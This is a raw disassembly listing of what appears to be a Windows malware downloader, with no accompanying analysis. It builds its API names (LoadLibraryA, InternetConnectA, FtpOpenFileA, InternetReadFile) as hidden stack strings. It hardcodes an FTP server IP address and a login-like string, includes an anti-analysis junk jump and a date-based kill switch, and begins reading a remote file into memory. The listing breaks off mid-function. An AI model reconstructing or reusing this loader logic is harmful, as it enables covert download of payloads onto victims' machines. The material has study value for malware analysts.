  40217b:	c6 45 9c 43          	movb   $0x43,-0x64(%ebp)
  40217f:	c6 45 9d 6f          	movb   $0x6f,-0x63(%ebp)
  402183:	c6 45 9e 6e          	movb   $0x6e,-0x62(%ebp)
  402187:	c6 45 9f 6e          	movb   $0x6e,-0x61(%ebp)
  40218b:	c6 45 a0 65          	movb   $0x65,-0x60(%ebp)
  40218f:	c6 45 a1 63          	movb   $0x63,-0x5f(%ebp)
  402193:	c6 45 a2 74          	movb   $0x74,-0x5e(%ebp)
  402197:	c6 45 a3 41          	movb   $0x41,-0x5d(%ebp)
  40219b:	c6 45 a4 00          	movb   $0x0,-0x5c(%ebp)
  40219f:	c6 45 cc 46          	movb   $0x46,-0x34(%ebp)
  4021a3:	c6 45 cd 74          	movb   $0x74,-0x33(%ebp)
  4021a7:	c6 45 ce 70          	movb   $0x70,-0x32(%ebp)
  4021ab:	c6 45 cf 4f          	movb   $0x4f,-0x31(%ebp)
  4021af:	c6 45 d0 70          	movb   $0x70,-0x30(%ebp)
  4021b3:	c6 45 d1 65          	movb   $0x65,-0x2f(%ebp)
  4021b7:	c6 45 d2 6e          	movb   $0x6e,-0x2e(%ebp)
  4021bb:	c6 45 d3 46          	movb   $0x46,-0x2d(%ebp)
  4021bf:	c6 45 d4 69          	movb   $0x69,-0x2c(%ebp)
  4021c3:	c6 45 d5 6c          	movb   $0x6c,-0x2b(%ebp)
  4021c7:	c6 45 d6 65          	movb   $0x65,-0x2a(%ebp)
  4021cb:	c6 45 d7 41          	movb   $0x41,-0x29(%ebp)
  4021cf:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4021d3:	c6 45 ec 46          	movb   $0x46,-0x14(%ebp)
  4021d7:	c6 45 ed 74          	movb   $0x74,-0x13(%ebp)
  4021db:	c6 45 ee 70          	movb   $0x70,-0x12(%ebp)
  4021df:	c6 45 ef 47          	movb   $0x47,-0x11(%ebp)
  4021e3:	c6 45 f0 65          	movb   $0x65,-0x10(%ebp)
  4021e7:	c6 45 f1 74          	movb   $0x74,-0xf(%ebp)
  4021eb:	c6 45 f2 46          	movb   $0x46,-0xe(%ebp)
  4021ef:	c6 45 f3 69          	movb   $0x69,-0xd(%ebp)
  4021f3:	c6 45 f4 6c          	movb   $0x6c,-0xc(%ebp)
  4021f7:	c6 45 f5 65          	movb   $0x65,-0xb(%ebp)
  4021fb:	c6 45 f6 53          	movb   $0x53,-0xa(%ebp)
  4021ff:	c6 45 f7 69          	movb   $0x69,-0x9(%ebp)
  402203:	c6 45 f8 7a          	movb   $0x7a,-0x8(%ebp)
  402207:	c6 45 f9 65          	movb   $0x65,-0x7(%ebp)
  40220b:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  40220f:	c6 85 7c ff ff ff 49 	movb   $0x49,-0x84(%ebp)
  402216:	c6 85 7d ff ff ff 6e 	movb   $0x6e,-0x83(%ebp)
  40221d:	c6 85 7e ff ff ff 74 	movb   $0x74,-0x82(%ebp)
  402224:	c6 85 7f ff ff ff 65 	movb   $0x65,-0x81(%ebp)
  40222b:	c6 45 80 72          	movb   $0x72,-0x80(%ebp)
  40222f:	c6 45 81 6e          	movb   $0x6e,-0x7f(%ebp)
  402233:	c6 45 82 65          	movb   $0x65,-0x7e(%ebp)
  402237:	c6 45 83 74          	movb   $0x74,-0x7d(%ebp)
  40223b:	c6 45 84 52          	movb   $0x52,-0x7c(%ebp)
  40223f:	c6 45 85 65          	movb   $0x65,-0x7b(%ebp)
  402243:	c6 45 86 61          	movb   $0x61,-0x7a(%ebp)
  402247:	c6 45 87 64          	movb   $0x64,-0x79(%ebp)
  40224b:	c6 45 88 46          	movb   $0x46,-0x78(%ebp)
  40224f:	c6 45 89 69          	movb   $0x69,-0x77(%ebp)
  402253:	c6 45 8a 6c          	movb   $0x6c,-0x76(%ebp)
  402257:	c6 45 8b 65          	movb   $0x65,-0x75(%ebp)
  40225b:	c6 45 8c 00          	movb   $0x0,-0x74(%ebp)
  40225f:	c6 45 b8 49          	movb   $0x49,-0x48(%ebp)
  402263:	c6 45 b9 6e          	movb   $0x6e,-0x47(%ebp)
  402267:	c6 45 ba 74          	movb   $0x74,-0x46(%ebp)
  40226b:	c6 45 bb 65          	movb   $0x65,-0x45(%ebp)
  40226f:	c6 45 bc 72          	movb   $0x72,-0x44(%ebp)
  402273:	c6 45 bd 6e          	movb   $0x6e,-0x43(%ebp)
  402277:	c6 45 be 65          	movb   $0x65,-0x42(%ebp)
  40227b:	c6 45 bf 74          	movb   $0x74,-0x41(%ebp)
  40227f:	c6 45 c0 43          	movb   $0x43,-0x40(%ebp)
  402283:	c6 45 c1 6c          	movb   $0x6c,-0x3f(%ebp)
  402287:	c6 45 c2 6f          	movb   $0x6f,-0x3e(%ebp)
  40228b:	c6 45 c3 73          	movb   $0x73,-0x3d(%ebp)
  40228f:	c6 45 c4 65          	movb   $0x65,-0x3c(%ebp)
  402293:	c6 45 c5 48          	movb   $0x48,-0x3b(%ebp)
  402297:	c6 45 c6 61          	movb   $0x61,-0x3a(%ebp)
  40229b:	c6 45 c7 6e          	movb   $0x6e,-0x39(%ebp)
  40229f:	c6 45 c8 64          	movb   $0x64,-0x38(%ebp)
  4022a3:	c6 45 c9 6c          	movb   $0x6c,-0x37(%ebp)
  4022a7:	c6 45 ca 65          	movb   $0x65,-0x36(%ebp)
  4022ab:	c6 45 cb 00          	movb   $0x0,-0x35(%ebp)
  4022af:	c6 45 dc 4b          	movb   $0x4b,-0x24(%ebp)
  4022b3:	c6 45 dd 65          	movb   $0x65,-0x23(%ebp)
  4022b7:	c6 45 de 72          	movb   $0x72,-0x22(%ebp)
  4022bb:	c6 45 df 6e          	movb   $0x6e,-0x21(%ebp)
  4022bf:	c6 45 e0 65          	movb   $0x65,-0x20(%ebp)
  4022c3:	c6 45 e1 6c          	movb   $0x6c,-0x1f(%ebp)
  4022c7:	c6 45 e2 33          	movb   $0x33,-0x1e(%ebp)
  4022cb:	c6 45 e3 32          	movb   $0x32,-0x1d(%ebp)
  4022cf:	c6 45 e4 00          	movb   $0x0,-0x1c(%ebp)
  4022d3:	c6 85 60 ff ff ff 4c 	movb   $0x4c,-0xa0(%ebp)
  4022da:	c6 85 61 ff ff ff 6f 	movb   $0x6f,-0x9f(%ebp)
  4022e1:	c6 85 62 ff ff ff 61 	movb   $0x61,-0x9e(%ebp)
  4022e8:	c6 85 63 ff ff ff 64 	movb   $0x64,-0x9d(%ebp)
  4022ef:	c6 85 64 ff ff ff 4c 	movb   $0x4c,-0x9c(%ebp)
  4022f6:	c6 85 65 ff ff ff 69 	movb   $0x69,-0x9b(%ebp)
  4022fd:	c6 85 66 ff ff ff 62 	movb   $0x62,-0x9a(%ebp)
  402304:	c6 85 67 ff ff ff 72 	movb   $0x72,-0x99(%ebp)
  40230b:	c6 85 68 ff ff ff 61 	movb   $0x61,-0x98(%ebp)
  402312:	c6 85 69 ff ff ff 72 	movb   $0x72,-0x97(%ebp)
  402319:	c6 85 6a ff ff ff 79 	movb   $0x79,-0x96(%ebp)
  402320:	c6 85 6b ff ff ff 41 	movb   $0x41,-0x95(%ebp)
  402327:	c6 85 6c ff ff ff 00 	movb   $0x0,-0x94(%ebp)
  40232e:	c6 85 70 ff ff ff 57 	movb   $0x57,-0x90(%ebp)
  402335:	c6 85 71 ff ff ff 69 	movb   $0x69,-0x8f(%ebp)
  40233c:	c6 85 72 ff ff ff 6e 	movb   $0x6e,-0x8e(%ebp)
  402343:	c6 85 73 ff ff ff 49 	movb   $0x49,-0x8d(%ebp)
  40234a:	c6 85 74 ff ff ff 6e 	movb   $0x6e,-0x8c(%ebp)
  402351:	c6 85 75 ff ff ff 65 	movb   $0x65,-0x8b(%ebp)
  402358:	c6 85 76 ff ff ff 74 	movb   $0x74,-0x8a(%ebp)
  40235f:	c6 85 77 ff ff ff 2e 	movb   $0x2e,-0x89(%ebp)
  402366:	c6 85 78 ff ff ff 64 	movb   $0x64,-0x88(%ebp)
  40236d:	c6 85 79 ff ff ff 6c 	movb   $0x6c,-0x87(%ebp)
  402374:	c6 85 7a ff ff ff 6c 	movb   $0x6c,-0x86(%ebp)
  40237b:	c6 85 7b ff ff ff 00 	movb   $0x0,-0x85(%ebp)
  402382:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402385:	50                   	push   %eax
  402386:	ff 15 30 40 40 00    	call   *0x404030
  40238c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40238f:	68 50 43 40 00       	push   $0x404350
  402394:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402397:	51                   	push   %ecx
  402398:	ff 15 28 40 40 00    	call   *0x404028
  40239e:	a3 18 54 40 00       	mov    %eax,0x405418
  4023a3:	68 60 43 40 00       	push   $0x404360
  4023a8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4023ab:	52                   	push   %edx
  4023ac:	ff 15 28 40 40 00    	call   *0x404028
  4023b2:	a3 10 54 40 00       	mov    %eax,0x405410
  4023b7:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4023bb:	0f 84 a1 00 00 00    	je     0x402462
  4023c1:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4023c7:	50                   	push   %eax
  4023c8:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4023cb:	51                   	push   %ecx
  4023cc:	ff 15 28 40 40 00    	call   *0x404028
  4023d2:	a3 0c 54 40 00       	mov    %eax,0x40540c
  4023d7:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  4023dd:	52                   	push   %edx
  4023de:	ff 15 0c 54 40 00    	call   *0x40540c
  4023e4:	89 45 90             	mov    %eax,-0x70(%ebp)
  4023e7:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  4023eb:	74 75                	je     0x402462
  4023ed:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4023f0:	50                   	push   %eax
  4023f1:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4023f4:	51                   	push   %ecx
  4023f5:	ff 15 28 40 40 00    	call   *0x404028
  4023fb:	a3 1c 54 40 00       	mov    %eax,0x40541c
  402400:	8d 55 94             	lea    -0x6c(%ebp),%edx
  402403:	52                   	push   %edx
  402404:	8b 45 90             	mov    -0x70(%ebp),%eax
  402407:	50                   	push   %eax
  402408:	ff 15 28 40 40 00    	call   *0x404028
  40240e:	a3 28 54 40 00       	mov    %eax,0x405428
  402413:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402416:	51                   	push   %ecx
  402417:	8b 55 90             	mov    -0x70(%ebp),%edx
  40241a:	52                   	push   %edx
  40241b:	ff 15 28 40 40 00    	call   *0x404028
  402421:	a3 08 54 40 00       	mov    %eax,0x405408
  402426:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402429:	50                   	push   %eax
  40242a:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40242d:	51                   	push   %ecx
  40242e:	ff 15 28 40 40 00    	call   *0x404028
  402434:	a3 14 54 40 00       	mov    %eax,0x405414
  402439:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  40243f:	52                   	push   %edx
  402440:	8b 45 90             	mov    -0x70(%ebp),%eax
  402443:	50                   	push   %eax
  402444:	ff 15 28 40 40 00    	call   *0x404028
  40244a:	a3 20 54 40 00       	mov    %eax,0x405420
  40244f:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402452:	51                   	push   %ecx
  402453:	8b 55 90             	mov    -0x70(%ebp),%edx
  402456:	52                   	push   %edx
  402457:	ff 15 28 40 40 00    	call   *0x404028
  40245d:	a3 24 54 40 00       	mov    %eax,0x405424
  402462:	b0 01                	mov    $0x1,%al
  402464:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402467:	33 cd                	xor    %ebp,%ecx
  402469:	e8 54 0a 00 00       	call   0x402ec2
  40246e:	8b e5                	mov    %ebp,%esp
  402470:	5d                   	pop    %ebp
  402471:	c3                   	ret
  402472:	cc                   	int3
  402473:	cc                   	int3
  402474:	cc                   	int3
  402475:	cc                   	int3
  402476:	cc                   	int3
  402477:	cc                   	int3
  402478:	cc                   	int3
  402479:	cc                   	int3
  40247a:	cc                   	int3
  40247b:	cc                   	int3
  40247c:	cc                   	int3
  40247d:	cc                   	int3
  40247e:	cc                   	int3
  40247f:	cc                   	int3
  402480:	55                   	push   %ebp
  402481:	8b ec                	mov    %esp,%ebp
  402483:	6a ff                	push   $0xffffffff
  402485:	68 2b 39 40 00       	push   $0x40392b
  40248a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402490:	50                   	push   %eax
  402491:	51                   	push   %ecx
  402492:	81 ec 90 02 00 00    	sub    $0x290,%esp
  402498:	a1 18 50 40 00       	mov    0x405018,%eax
  40249d:	33 c5                	xor    %ebp,%eax
  40249f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4024a2:	53                   	push   %ebx
  4024a3:	56                   	push   %esi
  4024a4:	57                   	push   %edi
  4024a5:	50                   	push   %eax
  4024a6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4024a9:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4024af:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4024b2:	c7 85 ac fd ff ff 00 	movl   $0x0,-0x254(%ebp)
  4024b9:	00 00 00 
  4024bc:	c6 85 00 fe ff ff 00 	movb   $0x0,-0x200(%ebp)
  4024c3:	68 03 01 00 00       	push   $0x103
  4024c8:	6a 00                	push   $0x0
  4024ca:	8d 85 01 fe ff ff    	lea    -0x1ff(%ebp),%eax
  4024d0:	50                   	push   %eax
  4024d1:	e8 6a 0d 00 00       	call   0x403240
  4024d6:	83 c4 0c             	add    $0xc,%esp
  4024d9:	90                   	nop
  4024da:	90                   	nop
  4024db:	90                   	nop
  4024dc:	60                   	pusha
  4024dd:	e9 31 00 00 00       	jmp    0x402513
  4024e2:	8b ec                	mov    %esp,%ebp
  4024e4:	6a ff                	push   $0xffffffff
  4024e6:	68 33 22 11 00       	push   $0x112233
  4024eb:	68 11 22 33 00       	push   $0x332211
  4024f0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4024f6:	50                   	push   %eax
  4024f7:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4024fe:	58                   	pop    %eax
  4024ff:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402505:	58                   	pop    %eax
  402506:	58                   	pop    %eax
  402507:	58                   	pop    %eax
  402508:	58                   	pop    %eax
  402509:	8b e8                	mov    %eax,%ebp
  40250b:	b8 50 10 40 00       	mov    $0x401050,%eax
  402510:	50                   	push   %eax
  402511:	e8 c3 61 e8 f7       	call   0xf82886d9
  402516:	fb                   	sti
  402517:	ff                   	(bad)
  402518:	ff 33                	push   (%ebx)
  40251a:	c9                   	leave
  40251b:	66 89 8d 7c fd ff ff 	mov    %cx,-0x284(%ebp)
  402522:	33 d2                	xor    %edx,%edx
  402524:	89 95 7e fd ff ff    	mov    %edx,-0x282(%ebp)
  40252a:	89 95 82 fd ff ff    	mov    %edx,-0x27e(%ebp)
  402530:	89 95 86 fd ff ff    	mov    %edx,-0x27a(%ebp)
  402536:	66 89 95 8a fd ff ff 	mov    %dx,-0x276(%ebp)
  40253d:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  402543:	50                   	push   %eax
  402544:	ff 15 2c 40 40 00    	call   *0x40402c
  40254a:	b9 e9 07 00 00       	mov    $0x7e9,%ecx
  40254f:	66 89 8d 7c fd ff ff 	mov    %cx,-0x284(%ebp)
  402556:	ba 06 00 00 00       	mov    $0x6,%edx
  40255b:	66 89 95 7e fd ff ff 	mov    %dx,-0x282(%ebp)
  402562:	b8 1e 00 00 00       	mov    $0x1e,%eax
  402567:	66 89 85 82 fd ff ff 	mov    %ax,-0x27e(%ebp)
  40256e:	b9 12 00 00 00       	mov    $0x12,%ecx
  402573:	66 89 8d 84 fd ff ff 	mov    %cx,-0x27c(%ebp)
  40257a:	8d 95 9c fd ff ff    	lea    -0x264(%ebp),%edx
  402580:	52                   	push   %edx
  402581:	8d 85 7c fd ff ff    	lea    -0x284(%ebp),%eax
  402587:	50                   	push   %eax
  402588:	ff 15 20 40 40 00    	call   *0x404020
  40258e:	85 c0                	test   %eax,%eax
  402590:	74 40                	je     0x4025d2
  402592:	8d 8d a4 fd ff ff    	lea    -0x25c(%ebp),%ecx
  402598:	51                   	push   %ecx
  402599:	8d 95 8c fd ff ff    	lea    -0x274(%ebp),%edx
  40259f:	52                   	push   %edx
  4025a0:	ff 15 20 40 40 00    	call   *0x404020
  4025a6:	85 c0                	test   %eax,%eax
  4025a8:	74 28                	je     0x4025d2
  4025aa:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  4025b0:	50                   	push   %eax
  4025b1:	8d 8d a4 fd ff ff    	lea    -0x25c(%ebp),%ecx
  4025b7:	51                   	push   %ecx
  4025b8:	ff 15 24 40 40 00    	call   *0x404024
  4025be:	83 f8 01             	cmp    $0x1,%eax
  4025c1:	75 0f                	jne    0x4025d2
  4025c3:	6a 00                	push   $0x0
  4025c5:	ff 15 1c 40 40 00    	call   *0x40401c
  4025cb:	33 c0                	xor    %eax,%eax
  4025cd:	e9 16 05 00 00       	jmp    0x402ae8
  4025d2:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%ebp)
  4025d9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4025e0:	8b 55 98             	mov    -0x68(%ebp),%edx
  4025e3:	8b 02                	mov    (%edx),%eax
  4025e5:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4025e8:	eb 1e                	jmp    0x402608
  4025ea:	6a 00                	push   $0x0
  4025ec:	6a 00                	push   $0x0
  4025ee:	68 6c 43 40 00       	push   $0x40436c
  4025f3:	6a 00                	push   $0x0
  4025f5:	ff 15 3c 41 40 00    	call   *0x40413c
  4025fb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402602:	b8 0f 26 40 00       	mov    $0x40260f,%eax
  402607:	c3                   	ret
  402608:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40260f:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  402616:	c7 85 1c ff ff ff 00 	movl   $0x0,-0xe4(%ebp)
  40261d:	00 00 00 
  402620:	c7 45 a0 00 00 00 00 	movl   $0x0,-0x60(%ebp)
  402627:	c7 45 90 00 10 00 00 	movl   $0x1000,-0x70(%ebp)
  40262e:	c7 85 10 ff ff ff 00 	movl   $0x0,-0xf0(%ebp)
  402635:	00 00 00 
  402638:	c7 85 18 ff ff ff 00 	movl   $0x0,-0xe8(%ebp)
  40263f:	00 00 00 
  402642:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%ebp)
  402649:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%ebp)
  402650:	8b 0d 78 43 40 00    	mov    0x404378,%ecx
  402656:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402659:	8b 15 7c 43 40 00    	mov    0x40437c,%edx
  40265f:	89 55 c8             	mov    %edx,-0x38(%ebp)
  402662:	c6 45 dc 33          	movb   $0x33,-0x24(%ebp)
  402666:	c6 45 dd 38          	movb   $0x38,-0x23(%ebp)
  40266a:	c6 45 de 2e          	movb   $0x2e,-0x22(%ebp)
  40266e:	c6 45 df 31          	movb   $0x31,-0x21(%ebp)
  402672:	c6 45 e0 38          	movb   $0x38,-0x20(%ebp)
  402676:	c6 45 e1 31          	movb   $0x31,-0x1f(%ebp)
  40267a:	c6 45 e2 2e          	movb   $0x2e,-0x1e(%ebp)
  40267e:	c6 45 e3 34          	movb   $0x34,-0x1d(%ebp)
  402682:	c6 45 e4 32          	movb   $0x32,-0x1c(%ebp)
  402686:	c6 45 e5 2e          	movb   $0x2e,-0x1b(%ebp)
  40268a:	c6 45 e6 31          	movb   $0x31,-0x1a(%ebp)
  40268e:	c6 45 e7 32          	movb   $0x32,-0x19(%ebp)
  402692:	c6 45 e8 37          	movb   $0x37,-0x18(%ebp)
  402696:	c6 45 e9 00          	movb   $0x0,-0x17(%ebp)
  40269a:	c6 85 20 ff ff ff 73 	movb   $0x73,-0xe0(%ebp)
  4026a1:	c6 85 21 ff ff ff 62 	movb   $0x62,-0xdf(%ebp)
  4026a8:	c6 85 22 ff ff ff 66 	movb   $0x66,-0xde(%ebp)
  4026af:	c6 85 23 ff ff ff 65 	movb   $0x65,-0xdd(%ebp)
  4026b6:	c6 85 24 ff ff ff 00 	movb   $0x0,-0xdc(%ebp)
  4026bd:	c6 85 28 ff ff ff 00 	movb   $0x0,-0xd8(%ebp)
  4026c4:	33 c0                	xor    %eax,%eax
  4026c6:	89 85 29 ff ff ff    	mov    %eax,-0xd7(%ebp)
  4026cc:	89 85 2d ff ff ff    	mov    %eax,-0xd3(%ebp)
  4026d2:	89 85 31 ff ff ff    	mov    %eax,-0xcf(%ebp)
  4026d8:	89 85 35 ff ff ff    	mov    %eax,-0xcb(%ebp)
  4026de:	89 85 39 ff ff ff    	mov    %eax,-0xc7(%ebp)
  4026e4:	89 85 3d ff ff ff    	mov    %eax,-0xc3(%ebp)
  4026ea:	89 85 41 ff ff ff    	mov    %eax,-0xbf(%ebp)
  4026f0:	66 89 85 45 ff ff ff 	mov    %ax,-0xbb(%ebp)
  4026f7:	88 85 47 ff ff ff    	mov    %al,-0xb9(%ebp)
  4026fd:	6a 44                	push   $0x44
  4026ff:	6a 00                	push   $0x0
  402701:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  402707:	51                   	push   %ecx
  402708:	e8 33 0b 00 00       	call   0x403240
  40270d:	83 c4 0c             	add    $0xc,%esp
  402710:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402713:	89 95 28 ff ff ff    	mov    %edx,-0xd8(%ebp)
  402719:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40271c:	89 85 2c ff ff ff    	mov    %eax,-0xd4(%ebp)
  402722:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402725:	89 8d 30 ff ff ff    	mov    %ecx,-0xd0(%ebp)
  40272b:	66 8b 55 e8          	mov    -0x18(%ebp),%dx
  40272f:	66 89 95 34 ff ff ff 	mov    %dx,-0xcc(%ebp)
  402736:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  40273c:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  402742:	8a 8d 24 ff ff ff    	mov    -0xdc(%ebp),%cl
  402748:	88 8d 4c ff ff ff    	mov    %cl,-0xb4(%ebp)
  40274e:	8b 15 80 43 40 00    	mov    0x404380,%edx
  402754:	89 95 58 ff ff ff    	mov    %edx,-0xa8(%ebp)
  40275a:	a1 84 43 40 00       	mov    0x404384,%eax
  40275f:	89 85 5c ff ff ff    	mov    %eax,-0xa4(%ebp)
  402765:	66 8b 0d 88 43 40 00 	mov    0x404388,%cx
  40276c:	66 89 8d 60 ff ff ff 	mov    %cx,-0xa0(%ebp)
  402773:	8b 15 8c 43 40 00    	mov    0x40438c,%edx
  402779:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  40277f:	a1 90 43 40 00       	mov    0x404390,%eax
  402784:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  40278a:	8b 0d 94 43 40 00    	mov    0x404394,%ecx
  402790:	89 8d 74 ff ff ff    	mov    %ecx,-0x8c(%ebp)
  402796:	8a 15 98 43 40 00    	mov    0x404398,%dl
  40279c:	88 95 78 ff ff ff    	mov    %dl,-0x88(%ebp)
  4027a2:	8d 85 14 ff ff ff    	lea    -0xec(%ebp),%eax
  4027a8:	50                   	push   %eax
  4027a9:	e8 42 eb ff ff       	call   0x4012f0
  4027ae:	83 c4 04             	add    $0x4,%esp
  4027b1:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4027b8:	c7 85 68 ff ff ff 01 	movl   $0x1,-0x98(%ebp)
  4027bf:	00 00 00 
  4027c2:	c6 45 cc 57          	movb   $0x57,-0x34(%ebp)
  4027c6:	c6 45 cd 69          	movb   $0x69,-0x33(%ebp)
  4027ca:	c6 45 ce 6e          	movb   $0x6e,-0x32(%ebp)
  4027ce:	c6 45 cf 49          	movb   $0x49,-0x31(%ebp)
  4027d2:	c6 45 d0 6e          	movb   $0x6e,-0x30(%ebp)
  4027d6:	c6 45 d1 65          	movb   $0x65,-0x2f(%ebp)
  4027da:	c6 45 d2 74          	movb   $0x74,-0x2e(%ebp)
  4027de:	c6 45 d3 20          	movb   $0x20,-0x2d(%ebp)
  4027e2:	c6 45 d4 46          	movb   $0x46,-0x2c(%ebp)
  4027e6:	c6 45 d5 74          	movb   $0x74,-0x2b(%ebp)
  4027ea:	c6 45 d6 70          	movb   $0x70,-0x2a(%ebp)
  4027ee:	c6 45 d7 00          	movb   $0x0,-0x29(%ebp)
  4027f2:	33 c9                	xor    %ecx,%ecx
  4027f4:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4027f7:	6a 00                	push   $0x0
  4027f9:	6a 00                	push   $0x0
  4027fb:	6a 00                	push   $0x0
  4027fd:	6a 00                	push   $0x0
  4027ff:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402802:	52                   	push   %edx
  402803:	ff 15 1c 54 40 00    	call   *0x40541c
  402809:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
  40280f:	6a 00                	push   $0x0
  402811:	68 00 00 00 08       	push   $0x8000000
  402816:	6a 01                	push   $0x1
  402818:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  40281e:	50                   	push   %eax
  40281f:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  402825:	51                   	push   %ecx
  402826:	6a 00                	push   $0x0
  402828:	8d 95 28 ff ff ff    	lea    -0xd8(%ebp),%edx
  40282e:	52                   	push   %edx
  40282f:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  402835:	50                   	push   %eax
  402836:	ff 15 28 54 40 00    	call   *0x405428
  40283c:	89 85 0c ff ff ff    	mov    %eax,-0xf4(%ebp)
  402842:	83 bd 0c ff ff ff 00 	cmpl   $0x0,-0xf4(%ebp)
  402849:	75 34                	jne    0x40287f
  40284b:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  402851:	51                   	push   %ecx
  402852:	ff 15 24 54 40 00    	call   *0x405424
  402858:	c7 85 74 fd ff ff 00 	movl   $0x0,-0x28c(%ebp)
  40285f:	00 00 00 
  402862:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402869:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  40286f:	e8 4c ec ff ff       	call   0x4014c0
  402874:	8b 85 74 fd ff ff    	mov    -0x28c(%ebp),%eax
  40287a:	e9 69 02 00 00       	jmp    0x402ae8
  40287f:	6a 00                	push   $0x0
  402881:	68 02 00 00 80       	push   $0x80000002
  402886:	68 00 00 00 80       	push   $0x80000000
  40288b:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  40288e:	52                   	push   %edx
  40288f:	8b 85 0c ff ff ff    	mov    -0xf4(%ebp),%eax
  402895:	50                   	push   %eax
  402896:	ff 15 08 54 40 00    	call   *0x405408
  40289c:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40289f:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  4028a3:	75 41                	jne    0x4028e6
  4028a5:	8b 8d 0c ff ff ff    	mov    -0xf4(%ebp),%ecx
  4028ab:	51                   	push   %ecx
  4028ac:	ff 15 24 54 40 00    	call   *0x405424
  4028b2:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  4028b8:	52                   	push   %edx
  4028b9:	ff 15 24 54 40 00    	call   *0x405424
  4028bf:	c7 85 70 fd ff ff 00 	movl   $0x0,-0x290(%ebp)
  4028c6:	00 00 00 
  4028c9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4028d0:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  4028d6:	e8 e5 eb ff ff       	call   0x4014c0
  4028db:	8b 85 70 fd ff ff    	mov    -0x290(%ebp),%eax
  4028e1:	e9 02 02 00 00       	jmp    0x402ae8
  4028e6:	6a 00                	push   $0x0
  4028e8:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4028eb:	50                   	push   %eax
  4028ec:	ff 15 14 54 40 00    	call   *0x405414
  4028f2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4028f5:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  4028f8:	51                   	push   %ecx
  4028f9:	e8 20 06 00 00       	call   0x402f1e
  4028fe:	83 c4 04             	add    $0x4,%esp
  402901:	89 85 6c fd ff ff    	mov    %eax,-0x294(%ebp)
  402907:	8b 95 6c fd ff ff    	mov    -0x294(%ebp),%edx
  40290d:	89 95 1c ff ff ff    	mov    %edx,-0xe4(%ebp)
  402913:	8b 45 90             	mov    -0x70(%ebp),%eax
  402916:	50                   	push   %eax
  402917:	e8 02 06 00 00       	call   0x402f1e
  40291c:	83 c4 04             	add    $0x4,%esp
  40291f:	89 85 68 fd ff ff    	mov    %eax,-0x298(%ebp)
  402925:	8b 8d 68 fd ff ff    	mov    -0x298(%ebp),%ecx
  40292b:	89 8d 10 ff ff ff    	mov    %ecx,-0xf0(%ebp)
  402931:	8b 55 90             	mov    -0x70(%ebp),%edx
  402934:	52                   	push   %edx
  402935:	6a 00                	push   $0x0
  402937:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  40293d:	50                   	push   %eax
  40293e:	e8 fd 08 00 00       	call   0x403240
  402943:	83 c4 0c             	add    $0xc,%esp
